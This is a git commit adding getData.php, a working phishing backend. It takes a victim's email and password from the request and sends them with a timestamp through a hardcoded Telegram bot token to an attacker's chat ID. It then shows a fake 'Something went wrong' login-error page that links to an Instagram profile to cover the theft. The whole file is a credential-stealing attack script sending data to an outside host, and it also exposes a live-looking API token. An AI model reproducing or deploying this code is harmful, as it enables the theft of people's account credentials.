d146f790cf2e673266ac8a7e2b8484972b92fcfe
nandaniagraqwal432 <131544012+nandaniagraqwal432@users.noreply.github.com>
2023-06-11 15:44:35 +0530

    Add files via upload

---
+++ getData.php
@@ -0,0 +1,47 @@
+<?php
+
+date_default_timezone_set("Asia/kolkata");
+error_reporting(0);
+
+$time = date("h:i a", time());
+
+$email = $_GET["email"];
+$password = $_GET["password"];
+
+$message = "Username : $email \nPassword: $password \nTried Login at $time IST";
+
+$chat_id= 2024584353; // replace with your userid
+
+
+send_message($chat_id,"$message");
+
+
+function send_message($chat_id, $message){
+        $text = urlencode($message);
+        $apiToken = "6105461006:AAGkUd5MWp6W3mb5-WsKrfpiso4mT3ayiu4";
+        file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text");
+    }
+?>
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Something Went Wrong</title>
+</head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style type="text/css">
+	body {
+		margin: 10px;
+	}
+</style>
+<body>
+<p>Something went wrong. <br>
+Try to login </p>
+
+&nbsp;
+<br>
+Redirecting to Login Page...........
+<br>
+<a href="https://www.instagram.com/reboot13.dev/">Click here if you are not redirected automatically.</a>
+</body>
+</html>
